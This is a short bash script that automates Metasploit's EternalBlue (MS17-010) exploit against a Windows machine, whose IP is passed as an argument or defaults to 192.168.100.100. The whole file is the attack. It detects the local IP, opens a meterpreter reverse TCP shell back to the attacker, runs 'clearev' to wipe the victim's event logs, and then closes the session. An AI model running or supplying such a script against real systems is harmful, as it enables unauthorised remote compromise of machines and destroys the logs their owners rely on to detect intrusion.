#!/bin/bash 

# remote host windows target, change this if you want to attack different machine
# to attack a different target simply pass ip as first arg to this script
if [ -z $1 ]; then 
	rhosts="192.168.100.100" # default target to attack, change as needed
else
	rhosts="$1"
fi

snet=$(echo $rhosts | cut -d '.' -f1-3)
# get lhost based off target subnet
lhost=$(ip a | grep $snet | awk {'print $2'} | awk {'split($0,a,"/");print a[1]}')

echo rhosts: $rhosts snet: $snet lhost: $lhost

# todo automatically find this !
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; \
			set RHOSTS $rhosts; set LHOST $lhost; \
			set payload windows/x64/meterpreter/reverse_tcp; \
			exploit -z; \
			sessions -C clearev -i 1; \
			sessions -K; \
			exit -y"
# could use 'sessions -i 1' to get into session, but we skip since this is automated
